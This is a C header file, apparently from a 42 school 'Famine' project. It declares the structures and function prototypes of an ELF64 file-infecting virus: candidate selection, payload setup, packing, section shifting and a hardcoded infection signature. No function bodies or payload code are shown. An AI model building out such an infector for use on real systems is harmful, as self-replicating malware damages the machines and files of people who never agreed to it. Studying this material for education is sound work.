/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jfortin <jfortin@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/15 17:17:38 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef INFECT_H
# define INFECT_H

# include <fcntl.h>
# include <stdint.h>
# include <unistd.h>
# include <sys/types.h>
# include "famine.h"
# include "accessors.h"

/*
** inline markers + hardcoded signature
** see famine.s
*/

# define CALL_INSTR_SIZE	5 /* sizeof "call mark_below" -> e8 2000 0000 */
# define SIGNATURE_LEN		64
# define SIGNATURE_CKSUM	0x1526

# define SHIFT_ALIGNMENT	4096
# define ALIGN(x, n)		(((x) + (n)) & ~((n) - 1))

/*
** file data
*/

struct				famine
{
	struct safe_pointer	original_safe;
	struct safe_pointer	clone_safe;
};

struct				entry
{
	struct elf64_phdr	*safe_phdr;
	struct elf64_shdr	*safe_shdr;
	struct elf64_shdr	*safe_last_section_shdr;
	size_t			end_of_last_section;
	size_t			offset_in_section;
};

struct				field
{
	size_t			offset; // inclusive begin offset
	size_t			end;    // exclusive end offset
};

typedef	bool	(*f_iter_callback)(struct safe_pointer info, size_t offset, void *data);

/*
** iterators
*/

bool	foreach_phdr(const struct safe_pointer info, f_iter_callback callback, void *data);
bool	foreach_shdr(const struct safe_pointer info, f_iter_callback callback, void *data);

/*
** infect
*/

bool		infect_if_candidate(const char *file);
bool		elf64_packer(const struct famine food, size_t original_file_size);
bool		find_entry(struct entry *original_entry, struct safe_pointer info);
bool		can_infect(const struct entry *original_entry, const struct safe_pointer info);
bool		setup_payload(const struct entry *original_entry, const struct safe_pointer info);
bool		adjust_references(const struct safe_pointer info, size_t shift_amount, const struct entry *original_entry);
bool		copy_to_clone(const struct famine food, size_t end_last_sect, \
			size_t shift_amount, size_t original_size);

/*
** payload
*/

void		_start(void);

#endif
